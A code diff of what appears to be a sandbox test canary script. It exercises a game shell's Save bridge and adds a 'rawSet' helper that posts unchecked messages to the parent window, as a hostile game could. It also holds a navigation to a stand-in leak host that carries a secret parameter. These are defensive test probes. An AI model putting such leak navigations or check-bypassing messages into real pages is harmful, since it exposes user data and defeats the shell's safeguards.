@@ -157,10 +157,15 @@ __canary.navigate = function () {
   setTimeout(function () { location.href = "http://selfnav.leak.example/?secret=1"; }, 300);
 };
 
+// Posts straight to the shell, skipping Save's own checks, as a hostile game could.
+__canary.rawSet = function (key, value) {
+  parent.postMessage({ mt: "set", key: key, value: value }, "*");
+};
+
 // Save bridge checks, driven by the test.
 __canary.save = async function (key, value) {
   await Save.ready;
-  if (value !== undefined) Save.set(key, value);
+  if (value !== undefined) { Save.set(key, value); }
   return { value: Save.get(key), persistent: Save.persistent, keys: Save.keys() };
 };
 </script>
